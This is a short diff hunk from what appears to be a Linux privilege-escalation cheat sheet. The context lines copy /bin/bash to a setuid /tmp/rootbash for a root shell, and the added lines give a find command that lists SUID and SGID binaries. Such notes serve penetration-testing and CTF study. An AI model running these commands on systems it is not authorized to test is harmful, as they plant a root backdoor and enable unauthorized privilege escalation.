@@ -523,3 +523,6 @@ cp /bin/bash /tmp/rootbash
 chmod +s /tmp/rootbash
 Once the /tmp/rootbash file is created, execute it (with 
 -p to preserve the effective UID) to gain a root shell:
+
+Find SUID & SGID Binaries:
+find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
